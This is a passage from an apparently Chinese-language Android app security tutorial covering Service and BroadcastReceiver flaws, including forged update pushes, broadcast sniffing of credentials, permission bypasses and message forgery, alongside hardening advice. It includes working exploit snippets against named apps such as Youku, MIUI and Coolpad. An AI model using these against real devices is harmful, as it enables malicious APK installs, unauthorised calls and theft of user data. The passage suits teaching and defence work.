class="string">&quot;PushMsg&quot;</span>);</span><br><span class="line">        ......</span><br><span class="line">        AppVersionManager.getInstance(Youku.context).showAppAgreementDialog();</span><br><span class="line">        <span class="keyword">switch</span>(pushMsg.type) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                <span class="keyword">goto</span> label_53;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    label_53:</span><br><span class="line">        intent.setFlags(<span class="number">876609536</span>);</span><br><span class="line">        intent.setClass(<span class="built_in">this</span>, UpdateActivity.class);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateurl&quot;</span>, pushMsg.updateurl);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateversion&quot;</span>, pushMsg.updateversion);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updatecontent&quot;</span>, pushMsg.updatecontent);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateType&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">this</span>.startActivity(intent);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure><p><strong>漏洞分析</strong></p><p>我们可以发现从Intent从获取名为PushMsg的Serializable的数据，并根据其成员type来执行不同的流程，当type值为1时，执行App的升级操作。升级所需的相关数据如app的下载地址等也是从该序列化数据中获取。升级的具体流程在com.youku.ui.activity.UpdateActivity中，简单分析后发现升级过程未对下载地址等进行判断，因此可以任意指定该地址。</p><p><strong>漏洞攻击</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用下面代码 修改pushMsg内容，并重打包进目标应用中 进而实现伪造</span></span><br><span class="line"><span class="type">PushMsg</span> <span class="variable">pushMsg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PushMsg</span>();</span><br><span class="line">pushMsg.type = <span class="number">1</span>;</span><br><span class="line">pushMsg.updateurl = <span class="string">&quot;http://gdown.baidu.com/data/wisegame/41839d1d510870f4/jiecaojingxuan_51.apk&quot;</span>;</span><br><span class="line">pushMsg.updatecontent = <span class="string">&quot;This is Fake&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.youku.phone&quot;</span>,<span class="string">&quot;com.youku.service.push.StartActivityService&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;PushMsg&quot;</span>, pushMsg);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure><p>其中PushMsg类不需要完整实现，只需要编译通过即可；<br>2.反编译优酷客户端的App得到smali代码，从中提取出PushMsg.smali；<br>3.反编译上述创建的APK文件，将原PushMsg类的smali文件替换为优酷中的PushMsg.smali文件，重新打包签名；<br>4.安装并运行重打包后的APK，会看到优酷的升级页面触发，如果设计的好的话，是可以诱导用户安装攻击者指定的APK文件的。</p><h4 id="拒接服务攻击"><a href="#拒接服务攻击" class="headerlink" title="拒接服务攻击"></a><strong>拒接服务攻击</strong></h4><p><strong>原理介绍</strong></p><p>Service的拒绝服务主要源于Service启动时对接收的Intent等没有做异常处理情况下，导致崩溃，主要体现在给Service传输的intent或者传输序列化对象导致接收时候的类型传化异常。</p><p><strong>漏洞复现</strong></p><p><a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-048028"><strong>雪球最新Android客户端存在空指针异常及信息泄露漏洞</strong></a></p><p>adb shell 下执行下面命令，虚拟机将崩溃。愿意在于空指针调用</p><p><img src="2025-01-15-App安全分析指南/905443_N58T5GMF5RW6URH.png" alt="image-20210908160946499"></p><h4 id="Service的安全防护"><a href="#Service的安全防护" class="headerlink" title="Service的安全防护"></a>Service的安全防护</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">安全防护：</span><br><span class="line">    （<span class="number">1</span>）私有service不定义<span class="built_in">int</span>ent-filter并且设置exported为<span class="literal">false</span></span><br><span class="line">    （<span class="number">2</span>）公开的service设置exported为<span class="literal">true</span>，<span class="built_in">int</span>ent-filter可以定义或者不定义</span><br><span class="line">    （<span class="number">3</span>）合作service需对合作方的app签名做校验</span><br><span class="line">    （<span class="number">4</span>）只被应用本身使用的service应设置为私有</span><br><span class="line">    （<span class="number">5</span>）service接收的数据需要谨慎处理</span><br><span class="line">    （<span class="number">6</span>）内部service需要使用签名级别的protectionLevel来判断是否为内部应用调用</span><br><span class="line">    （<span class="number">7</span>）不应在service创建（onCreate方法被调用）的时候决定是否提供服务，应在onStartCommand/onBind/onHandleIntent等方法被调用时做判断</span><br><span class="line">    （<span class="number">8</span>）当service又返回数据的时候，因判断数据接收app是否又信息泄露的风险</span><br><span class="line">    （<span class="number">9</span>）有明确的服务需调用时使用显示意图</span><br><span class="line">    （<span class="number">10</span>）尽量不发送敏感信息</span><br><span class="line">    （<span class="number">11</span>）启动Activity时不设置<span class="built_in">int</span>ent的FLAG_ACTIVITY_NEW_TASK标签</span><br></pre></td></tr></table></figure><h2 id="BroadcastReceiver相关漏洞"><a href="#BroadcastReceiver相关漏洞" class="headerlink" title="BroadcastReceiver相关漏洞"></a>BroadcastReceiver相关漏洞</h2><h3 id="自定义广播接收者BroadcastReceiver"><a href="#自定义广播接收者BroadcastReceiver" class="headerlink" title="自定义广播接收者BroadcastReceiver"></a>自定义广播接收者BroadcastReceiver</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 继承BroadcastReceivre类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">mBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// 复写onReceive()方法</span></span><br><span class="line">  <span class="comment">// 接收到广播后，则自动调用该方法</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">   <span class="comment">//写入接收广播后的操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">操作步骤：</span><br><span class="line">（<span class="number">1</span>）继承BroadcastReceivre基类</span><br><span class="line">（<span class="number">2</span>）必须复写抽象方法onReceive()方法</span><br><span class="line">    广播接收器接收到相应广播后，会自动回调 onReceive() 方法，一般情况下，onReceive方法会涉及 与 其他组件之间的交互，如发送Notification、启动Service等，默认情况下，广播接收器运行在 UI 线程，因此，onReceive()方法不能执行耗时操作，否则将导致ANR</span><br></pre></td></tr></table></figure><h3 id="广播接收者注册"><a href="#广播接收者注册" class="headerlink" title="广播接收者注册"></a><strong>广播接收者注册</strong></h3><p>注册的两种方式：静态注册，动态注册</p><p><strong>静态注册</strong></p><p>在AndroidManifest.xml里通过<receive>标签声明</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    //<span class="attr">此广播接收者类是mBroadcastReceiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.mBroadcastReceiver&quot;</span> &gt;</span></span><br><span class="line">    //用于接收网络状态改变时发出的广播</span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>动态注册</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">I <span class="type">ntentFilter</span> <span class="variable">intentFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">intentFilter</span>();</span><br><span class="line">intentFilter.addAction(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">registerReceiver(<span class="string">&quot;networkChangeReceiver&quot;</span>,intentFilter);</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onPause</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">super</span>.onPause;</span><br><span class="line">    unregisterReceive(networkChangeReceiver);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">networkChangeReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context,Intent intent)</span>&#123;</span><br><span class="line">        Toast.makeText(context,<span class="string">&quot;network changes&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）实例化自定义的广播接收者，我们实现广播的功能，可以继承BroadcastReceiver类，并重写类中的方法</span><br><span class="line">（<span class="number">2</span>）实例化意图过滤器，并设置要过滤的广播类型</span><br><span class="line">（<span class="number">3</span>）使用Context的<span class="built_in">registerReceiver</span>(BroadcastReceiver,IntentFilter)方法注册广播</span><br><span class="line">（<span class="number">4</span>）在<span class="built_in">onDestory</span>()方法中通过调用<span class="built_in">unregisterReceiver</span>()方法来实现取消注册</span><br></pre></td></tr></table></figure><h3 id="广播的类型"><a href="#广播的类型" class="headerlink" title="广播的类型"></a>广播的类型</h3><h4 id="普通广播"><a href="#普通广播" class="headerlink" title="普通广播"></a>普通广播</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="comment">//对应BroadcastReceiver中intentFilter的action</span></span><br><span class="line">intent.setAction(<span class="string">&quot;BROADCAST_ACTION&quot;</span>);</span><br><span class="line"><span class="comment">//发送广播</span></span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure><p>若被注册了的广播接收者中注册时intentFilter的action与上述匹配，则会接收此广播（即进行回调onReceive()）,如下mBroadcastReceiver则会接收上述广播</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    //<span class="attr">此广播接收者类是mBroadcastReceiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.mBroadcastReceiver&quot;</span> &gt;</span></span><br><span class="line">    //用于接收网络状态改变时发出的广播</span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;BROADCAST_ACTION&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果发送的广播有对应权限，那么广播接收者也需要对应权限</p><h4 id="系统广播："><a href="#系统广播：" class="headerlink" title="系统广播："></a><strong>系统广播：</strong></h4><p>Android中内置了多个系统广播：只要涉及到手机的基本操作（如开机、网络状态变化、拍照等），都会发送相应的广播每个广播都有特定的Intent-Filter(包括具体的action)，Android系统广播action如下：</p><h4 id="有序广播"><a href="#有序广播" class="headerlink" title="有序广播"></a>有序广播</h4><p>发送出去的广播被广播接收者按照先后顺序接收 有序是针对广播接收者而言的。广播接收者接收广播的顺序规则（同时面向静态和动态注册的广播接收者）：</p><p>（1）按照Priority属性值从大-小排序<br>（2）Priority属性相同者，动态注册的广播优先</p><p><strong>特点</strong></p><p>（1）接收广播按顺序接收<br>（2）先接收的广播接收者可以对广播进行截断，即后接收的广播接收者不在接收此广播，可以使用abortBroadcast()方法<br>（3）先接收的广播接收者可以对广播进行修改，那么后接收的广播接收者将接收到被修改后的广播</p><p>具体使用：有序广播的使用过程与普通广播非常类似，差异仅在于广播的发送方式</p><p><code>sendOrderedBroadcast(intent,null); //参数1：接收的Intent 参数2：与权限相关字符串，一般为null</code></p><h4 id="本地广播"><a href="#本地广播" class="headerlink" title="本地广播"></a>本地广播</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">由于Android中的广播可以跨<span class="keyword">App</span>直接通信（exported对于有intent-filter情况下默认值为true）</span><br><span class="line">导致可能会出现的问题：</span><br><span class="line">    （1）其他<span class="keyword">App</span>针对性发出与当前<span class="keyword">App</span> intent-filter相匹配的广播，由此导致当前<span class="keyword">App</span>不断接收广播并处理</span><br><span class="line">    （2）其他<span class="keyword">App</span>注册与当前<span class="keyword">App</span>一致的intent-filter用于接收广播，获取广播的具体星系，会出现安全性和效率性问题</span><br><span class="line">解决方案：</span><br><span class="line">使用<span class="keyword">App</span>应用内广播（<span class="keyword">Local</span> Broadcast）</span><br><span class="line">    (1)<span class="keyword">App</span>应用内广播可理解为一种局部广播，广播的发送者和接收者都同属于一个<span class="keyword">App</span></span><br><span class="line">    (2)相比于全局广播（普通广播），<span class="keyword">App</span>应用内广播优势体现在：安全性高和效率高</span><br></pre></td></tr></table></figure><p><strong>实现步骤</strong></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">方法<span class="number">1</span>：</span><br><span class="line">将全局广播设置为局部广播</span><br><span class="line">（<span class="number">1</span>）注册广播是将exported属性设置为<span class="literal">false</span>，使得非本App内部发出的此广播不被接收</span><br><span class="line">（<span class="number">2</span>）在广播的发送和接收时，增设相应权限permission，用于权限验证</span><br><span class="line">（<span class="number">3</span>）发送广播时指定该广播接收器所在的包名，此广播将只会发送到此包中的App内与之相匹配的有效广播接收器中</span><br><span class="line">通过<span class="built_in">int</span>ent.setPackage(packageName)指定包名</span><br><span class="line"> </span><br><span class="line">方法<span class="number">2</span>：</span><br><span class="line">    使用封装好的LocalBroadcastManager类使用方式上与全局广播几乎相同，只是注册/取消注册广播接收器和发送广播时将参数context变成LocalBroadcastManager的单一实例。</span><br><span class="line">注意：对于LocalBroadcastManager方式发送的应用内广播，只能通过LocalBroadcastManager动态注册，不能静态注册</span><br></pre></td></tr></table></figure><p>方法二的具体实现：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注册应用内广播接收器</span></span><br><span class="line"><span class="comment">//步骤1：实例化BroadcastReceiver子类 &amp; IntentFilter mBroadcastReceiver</span></span><br><span class="line">mBroadcastReceiver = new mBroadcastReceiver();</span><br><span class="line">IntentFilter <span class="built_in">int</span>entFilter = new IntentFilter();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//步骤2：实例化LocalBroadcastManager的实例</span></span><br><span class="line">localBroadcastManager = LocalBroadcastManager.getInstance(<span class="keyword">this</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//步骤3：设置接收广播的类型</span></span><br><span class="line"><span class="built_in">int</span>entFilter.addAction(android.net.conn.CONNECTIVITY_CHANGE);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//步骤4：调用LocalBroadcastManager单一实例的registerReceiver（）方法进行动态注册</span></span><br><span class="line">localBroadcastManager.registerReceiver(mBroadcastReceiver, <span class="built_in">int</span>entFilter);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//取消注册应用内广播接收器</span></span><br><span class="line">localBroadcastManager.unregisterReceiver(mBroadcastReceiver);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//发送应用内广播</span></span><br><span class="line">Intent <span class="built_in">int</span>ent = new Intent();</span><br><span class="line"><span class="built_in">int</span>ent.setAction(BROADCAST_ACTION);</span><br><span class="line">localBroadcastManager.sendBroadcast(<span class="built_in">int</span>ent);</span><br></pre></td></tr></table></figure><h3 id="BroadcastReceiver漏洞原理分析"><a href="#BroadcastReceiver漏洞原理分析" class="headerlink" title="BroadcastReceiver漏洞原理分析"></a>BroadcastReceiver漏洞原理分析</h3><p><strong>漏洞种类</strong></p><ul><li>敏感信息泄露</li><li>权限绕过</li><li>消息伪造</li><li>拒绝服务</li></ul><h4 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h4><p><strong>原理介绍</strong>：</p><p>发送的intent没有明确指定接受者，而是简单的通过action进行匹配，恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播存在敏感数据，就被恶意应用窃取了。</p><p><strong>漏洞复现</strong></p><p>案例1</p><p>目标程序段代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">d</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">    v1.setAction(<span class="string">&quot;com.sample.action.server_running&quot;</span>);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;local_ip&quot;</span>,v0.h);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;port&quot;</span>,v0.i);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;code&quot;</span>,v0.g);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;connected&quot;</span>,v0.s);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;pwd_predefined&quot;</span>,v0.r);</span><br><span class="line">    <span class="keyword">if</span>(!TextUtils.isEmpty(v0.t))&#123;</span><br><span class="line">        v1.putExtra(<span class="string">&quot;connected_usr&quot;</span>,v0.t);</span><br><span class="line">    &#125;</span><br><span class="line">    sendBroadcast(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过intent隐式传递数据，所以编写一个接受者代码，响应action然后获取敏感数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context,Intent intent)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(intent.getAction().equals(<span class="string">&quot;com.sample.action.server_running&quot;</span>))&#123;</span><br><span class="line">        String pwd=intent.getStringExtra(<span class="string">&quot;connected&quot;</span>);</span><br><span class="line">        s=<span class="string">&quot;Airdroid =&gt; [&quot;</span>+pwd+<span class="string">&quot;]/&quot;</span>+intent.getExtras();</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeTest(context,String.format(<span class="string">&quot;%sReceived&quot;</span>,s),Toast.LENGTH_SHORT).show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>案例二：<a href="https://wwws.nightwatchcybersecurity.com/2018/11/11/cve-2018-9581/">Android 操作系统中通过 RSSI 广播暴露敏感数据 （CVE-2018-9581)</a></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Android操作系统会定期在系统范围内广播WiFI强度值（RSSI）,RSSI值表示设备接收到的信号</span><br><span class="line">的相对强度（更高=更强），但与实际物理强度dBm没有直接关系，这是通过两个独立的intents实现的，Android <span class="number">9</span>之前是android.net.wifi.STATE_CHANGE，其他安卓设备是android.net.wifi.RSSI_CHANGED</span><br><span class="line">    当应用通过WifiManager访问信息时，正常就在应用manifest中请求ACCESS_WIFI_STATE权限。因为<span class="built_in">WiFi</span> RTT特征是Android <span class="number">9</span>中新引入的，也是用于位置定位的，需要ACCESS_FINE_LOCATION权限。但监听系统广播时，</span><br><span class="line">在不需要通知用户，不需要其他权限的情况下就可以获取信息</span><br><span class="line">    存在的安全问题：</span><br><span class="line">    （<span class="number">1</span>）RSSI值是通过广播获取的，绕过的正常的权限检查（ACCESS_WIFI_STATE）</span><br><span class="line">    （<span class="number">2</span>）通过广播或WiFimanager获取的RSSI值可以在不需要其他位置权限的情况下进行室内定制</span><br></pre></td></tr></table></figure><p>攻击代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle state)</span> &#123;</span><br><span class="line">    <span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();       </span><br><span class="line">    filter.addAction(android.net.wifi.STATE_CHANGE);</span><br><span class="line">    filter.addAction(android.net.wifi.RSSI_CHANGED);</span><br><span class="line">    registerReceiver(receiver, filter);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">BroadcastReceiver</span> <span class="variable">receiver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BroadcastReceiver</span>() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">    Log.d(intent.toString());</span><br><span class="line">    ….</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h4><p><strong>原理介绍</strong></p><p>动态注册的广播默认都是导出的，如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控的url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等</p><p>案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-09175.html">小米MIUI漏洞可能导致硬件资源消耗</a></p><p><strong>漏洞详情</strong></p><p>MIUI内置的手电筒软件Stk.apk中，TorchService服务没有对广播来源进行验证，导致任何程序可以调用这个服务，打开或关闭手电筒，利用这个漏洞，可以导致系统电源迅速消耗</p><p>攻击代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;net.cactii.flash2.TOGGLE_FLASHLIGHT&quot;</span>);</span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure><p>案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-084520.html">酷派最安全手机s6拨打电话权限绕过</a></p><p>漏洞详情：</p><p>酷派最安全手机s6拨打电话权限绕过，第三方app可以无需拨打电话权限直接拨打电话</p><p><strong>攻击代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;com.android.phone&quot;</span>,<span class="string">&quot;com.android.phone.PhoneGlobals$NotificationBroadcastReceiver&quot;</span>));</span><br><span class="line">intent.setAction(<span class="string">&quot;com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION&quot;</span>);</span><br><span class="line">intent.setData(Uri.parse(<span class="string">&quot;tel:10000&quot;</span>));</span><br><span class="line">intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure><p>案例：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-084516.html">酷派最安全手机s6程序锁绕过</a></p><p>漏洞详情：</p><p>程序加锁解锁是靠广播来控制的，并且这两条广播没做权限限制，任意应用可以发送此广播达到恶意解锁、恶意锁定应用的目的</p><p><strong>漏洞测试</strong></p><p>用adb shell 发送广播，用来解锁</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -<span class="selector-tag">a</span> android<span class="selector-class">.intent</span><span class="selector-class">.action</span><span class="selector-class">.PACKAGE_FULLY_REMOVED</span> -d package:com<span class="selector-class">.wumii</span><span class="selector-class">.android</span>.mimi</span><br></pre></td></tr></table></figure><h4 id="消息伪造-1"><a href="#消息伪造-1" class="headerlink" title="消息伪造"></a>消息伪造</h4><p><strong>漏洞原理</strong></p><p>暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Receiver接收可能产生安全隐患</p><p><strong>漏洞复现</strong></p><p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-039801.html">百度云盘手机版钓鱼、信息泄露和代码执行高危漏洞三合一</a></p><p><strong>漏洞描述</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">百度云盘手机版存在高危漏洞，恶意攻击者通过该漏洞可以对手机用户进行钓鱼欺骗，盗取用户隐私文件和信息，以百度云盘APP权限执行任何代码。百度云盘有一个广播接收器没有对消息进行安全验证，通过发送恶意的消息，攻击者可以在用户手机通知栏上推送任意消息，点击消息后可以利用webview组件盗取本地隐私文件和执行任意代码。</span><br><span class="line">存在漏洞的组件是：com<span class="selector-class">.baidu</span><span class="selector-class">.android</span><span 